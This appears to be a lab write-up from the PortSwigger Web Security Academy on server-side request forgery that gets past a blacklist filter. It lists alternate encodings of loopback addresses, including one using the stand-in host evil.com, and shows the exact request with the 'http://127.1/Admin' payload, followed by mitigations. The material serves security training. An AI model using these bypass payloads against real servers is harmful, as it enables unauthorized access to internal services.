# 📘 Scenario 4: SSRF – Bypass Blacklist Filters via Alternate IP Formats

## 🔎 Vulnerability Description

In this scenario, the application attempts to prevent SSRF by blocking specific blacklisted values such as `localhost` or `127.0.0.1`. However, the filter is **poorly implemented** and fails to account for alternate representations of the same internal address (e.g., `127.1`, `LOCALHOST`, mixed casing), allowing the attacker to **bypass the blacklist** and perform SSRF.

> **Vulnerability Type:** Input Validation (Bypass), SSRF  
> **OWASP Top 10 ID:** A10:2021 – Server-Side Request Forgery  
> **Risk Level:** Medium  

---

## 🧠 Common Bypass Techniques

| Target Address | Bypass Variant |
|----------------|----------------|
| `127.0.0.1`     | `127.1`, `2130706433`, `0x7f000001` |
| `localhost`     | `LOCALHOST`, `LocAlHost`, `localhost%00` |
| Normal URL      | `http://127.1`, `http://127.0.0.1#@evil.com`, `http://127.0.0.1%2F..` |

---

## 🔧 Target

**URL:**


🔗 https://0acc009b035c39e98104173b00d7001f.web-security-academy.net/product/stock

---

## 📥 HTTP Request

```http
POST /product/stock HTTP/2
Host: 0acc009b035c39e98104173b00d7001f.web-security-academy.net
Cookie: session=Hgh3EncJZrjrEzW3M66PsxoGnQQPNILJ
Content-Length: 27
Sec-Ch-Ua: "Chromium";v="125", "Not.A/Brand";v="24"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0acc009b035c39e98104173b00d7001f.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0acc009b035c39e98104173b00d7001f.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i
 
stockApi=http://127.1/Admin

```
---
## 📥 Server Response
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Set-Cookie: session=5F1GuvvECrftQt3ks3539gTzkjlIXUY0; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 3074

```
---

## 🧪 Exploitation Steps

Send a request with the stockAPI parameter targeting an internal address.

Attempt variants such as:

`http://127.1/admin`

`http://LOCALHOST/admin`

`http://127.0.0.1#@external.com/`

Use Burp Suite Repeater to compare filtered vs bypassed results.

Observe any different responses that suggest successful SSRF.

## 💥 Potential Impact

- Blacklist filtering gives a **false sense of security**.

- Attacker can still access internal services by using alternate encoding.

- Allows data exposure or further pivoting (e.g., metadata service access).   

- **Precursor to RCE or lateral movement**.

## ✅ Mitigation Suggestions
- Do **not rely** on blacklist filtering alone.

- Use strict **allowlists** with resolved IP address checks.

- Normalize and canonicalize input before filtering.

- Block loopback and private IP ranges via server configuration, not only in code.

## 📸 Screenshot

![Exploitation Image Of Scenario 4](https://github.com/hovikhanh/ssrf-demo/images/Picture4.png "Exploitation Image Of Scenario 4")

## 🔗 References

[PayloadsAllTheThings – SSRF Bypass Techniques](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)

[OWASP SSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

> 🚨 This scenario highlights that SSRF protection using basic pattern matching is insufficient. Always verify resolved IPs and use robust filtering mechanisms.